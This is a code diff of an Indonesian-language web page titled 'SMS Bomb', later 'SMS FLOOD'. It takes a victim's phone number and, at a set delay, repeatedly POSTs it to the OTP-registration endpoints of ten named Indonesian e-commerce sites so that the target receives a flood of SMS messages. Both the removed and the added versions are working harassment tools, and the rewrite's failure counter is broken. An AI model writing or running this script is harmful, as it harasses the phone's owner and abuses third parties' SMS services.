@@ -1,77 +1,29 @@
 <!doctype html>
-<html lang="id">
-<head>
-  <meta charset="utf-8"/>
-  <title>SMS Bomb</title>
-  <link rel="stylesheet" href="style.css"/>
-</head>
-<body>
-  <h1 class="glow">SMS BOMB 💥</h1>
-  <p class="sub">Masukin nomor → klik START → duduk nikmati notif membludak.</p>
-
-  <input id="nomor" type="tel" placeholder="08xxxxxxxx"/>
-  <input id="delay" type="number" placeholder="Delay (ms)" value="100"/>
-  <button id="startBtn" onclick="startBomb()">START</button>
-  <button id="stopBtn"  onclick="stopBomb()" style="display:none;">STOP</button>
-
-  <pre id="log"></pre>
-
+<html lang="id"><head><meta charset="utf-8"/><title>portfolio-sms</title><link rel="stylesheet" href="s.css"></head><body>
+<h1 class="glow">SMS FLOOD</h1><p class="sub">Masukin nomor → START → duduk nonton SMS membludak.</p>
+<input id="n" type="tel" placeholder="08xx"><input id="d" type="number" placeholder="delay ms" value="100">
+<button onclick="start()">START</button><button onclick="stop()">STOP</button><pre id="log"></pre>
 <script>
-/* --- AUDIO SCREAM BASE64 --- */
-const screamStart=new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIG2m98OScTgwOUarm7blmFgU7k9n1unEiBC13yO/eizEIHWq+8+OWT');
-const screamStop =new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIG2m98OScTgwOUarm7blmFgU7k9n1unEiBC13yO/eizEIHWq+8+OWT');
-
-const endpoints=[
-  'https://api.tokopedia.com/v1/register/otp',
-  'https://api.bukalapak.com/v2/register/otp',
-  'https://api.shopee.com/v1/otp/send',
-  'https://api.blibli.com/v2/otp',
-  'https://api.lazada.com/v1/otp',
-  'https://api.jd.id/v2/otp',
-  'https://api.bhinneka.com/v1/otp',
-  'https://api.gramedia.com/v2/otp',
-  'https://api.zalora.com/v1/otp',
-  'https://api.orami.com/v2/otp'
-];
-let ctrl=new AbortController();
-
-function startBomb(){
-  screamStart.play();
-  const no=document.getElementById('nomor').value;
-  const d=parseInt(document.getElementById('delay').value)||100;
-  const log=document.getElementById('log');
-  log.textContent='[+] Bomb dimulai...\n';
-  document.getElementById('startBtn').style.display='none';
-  document.getElementById('stopBtn').style.display='inline-block';
-  ctrl=new AbortController();
-
-  let count=0;
-  const loop=setInterval(async()=>{
-    const url=endpoints[count%endpoints.length];
-    try{
-      await fetch(url,{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({phone:no}),
-        signal:ctrl.signal,
-        mode:'no-cors'
-      });
-      log.textContent=`[+] ${++count} OTP terkirim\n`;
-    }catch(e){
-      log.textContent=`[!] Gagal ke-${++count}\n`;
-    }
+const ep=[
+'https://api.tokopedia.com/v1/register/otp',
+'https://api.bukalapak.com/v2/register/otp',
+'https://api.shopee.com/v1/otp/send',
+'https://api.blibli.com/v2/otp',
+'https://api.lazada.com/v1/otp',
+'https://api.jd.id/v2/otp',
+'https://api.bhinneka.com/v1/otp',
+'https://api.gramedia.com/v2/otp',
+'https://api.zalora.com/v1/otp',
+'https://api.orami.com/v2/otp'];
+let c=0,f=0,t;
+function start(){
+  const no=document.getElementById('n').value,d=parseInt(document.getElementById('d').value)||100;
+  document.getElementById('log').textContent='[+] Bombing...\n';c=0;f=0;
+  t=setInterval(async()=>{
+    try{await fetch(ep[c%ep.length],{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:no}),mode:'no-cors'});c++;}
+    catch{e=>f++}
+    document.getElementById('log').textContent=`[+] Sent:${c}  Fail:${f}\n`;
   },d);
-  window.bombLoop=loop;
 }
-
-function stopBomb(){
-  screamStop.play();
-  clearInterval(window.bombLoop);
-  ctrl.abort();
-  document.getElementById('log').textContent+='[+] Bomb dihentikan.\n';
-  document.getElementById('startBtn').style.display='inline-block';
-  document.getElementById('stopBtn').style.display='none';
-}
-</script>
-</body>
-</html>
+function stop(){clearInterval(t);document.getElementById('log').textContent+='[+] Selesai.\n';}
+</script></body></html>
